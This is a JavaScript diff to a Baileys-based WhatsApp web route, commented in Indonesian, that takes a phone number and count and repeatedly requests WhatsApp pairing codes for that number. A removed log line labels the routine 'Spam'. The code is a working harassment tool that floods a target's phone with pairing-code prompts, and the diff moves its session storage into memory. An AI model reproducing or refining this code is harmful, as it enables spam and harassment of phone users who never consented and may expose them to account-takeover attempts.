@@ -5,8 +5,8 @@ const {
 } = require("baileys");
 const Pino = require("pino");
 const chalk = require("chalk");
-const fs = require("fs");
-const path = require("path");
+
+let sessionCache = {}; // Cache untuk menyimpan sesi di memory
 
 function no(number) {
     return number.replace(/\D/g, "").replace(/^0/, "62");
@@ -23,55 +23,50 @@ module.exports = (app) => {
         let target = no(number);
         let jumlah = parseInt(count) || 20;
 
-        let dir = path.join(__dirname, "tmp", target);
-        if (!fs.existsSync(dir)) {
-            fs.mkdirSync(dir, { recursive: true });
+        // Cek apakah sesi sudah ada di cache
+        if (!sessionCache[target]) {
+            console.log("> 🔍 Sesi tidak ditemukan, membuat sesi baru...");
+
+            const { state } = await useMultiFileAuthState();
+            sessionCache[target] = state; // Simpan sesi di memory
+        } else {
+            console.log("> 🔄 Menggunakan sesi yang sudah ada di memory...");
         }
-
-        const { state, saveCreds } = await useMultiFileAuthState(dir);
-
-        console.log(
-            `> *– 乂 Memulai Proses Spam!*\n\n` +
-            `> 📞 *Nomor:* @${target}\n` +
-            `> 🔢 *Total:* ${jumlah}`
-        );
 
         const config = {
             logger: Pino({ level: "fatal" }).child({ level: "fatal" }),
             printQRInTerminal: false,
             mobile: false,
             auth: {
-                creds: state.creds,
-                keys: makeCacheableSignalKeyStore(state.keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
+                creds: sessionCache[target].creds,
+                keys: makeCacheableSignalKeyStore(sessionCache[target].keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
             },
             version: [2, 3e3, 1015901307],
             browser: ["Ubuntu", "Edge", "110.0.1587.56"],
             markOnlineOnConnect: true,
-            generateHighQualityLinkPreview: true,
-            defaultQueryTimeoutMs: undefined,
         };
 
         let sock = makeWASocket(config);
 
-                console.log("> ✅ Koneksi berhasil!");
-                
-                setTimeout(async () => {
-                    for (let i = 0; i < jumlah; i++) {
-                        try {
-                            let retries = i + 1;
-                            let pairing = await sock.requestPairingCode(target);
-                            let code = pairing?.match(/.{1,4}/g)?.join("-") || pairing;
-                            
-                            console.log(
-                                `> ${chalk.yellow.bold("[" + retries + "/" + jumlah + "]")} ` +
-                                `😛 Kode pairing anda: ${code}`
-                            );
-                        } catch (err) {
-                            console.log(`> ❌ Gagal mendapatkan pairing code: ${err.message}`);
-                        }
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-                    }
-                }, 3000);
+        console.log("> ✅ Koneksi berhasil!");
+
+        setTimeout(async () => {
+            for (let i = 0; i < jumlah; i++) {
+                try {
+                    let retries = i + 1;
+                    let pairing = await sock.requestPairingCode(target);
+                    let code = pairing?.match(/.{1,4}/g)?.join("-") || pairing;
+
+                    console.log(
+                        `> ${chalk.yellow.bold("[" + retries + "/" + jumlah + "]")} ` +
+                        `😛 Kode pairing anda: ${code}`
+                    );
+                } catch (err) {
+                    console.log(`> ❌ Gagal mendapatkan pairing code: ${err.message}`);
+                }
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+        }, 3000);
 
         return res.json({ status: true, result: { message: "✅ Proses pairing dimulai!", target, jumlah } });
     });
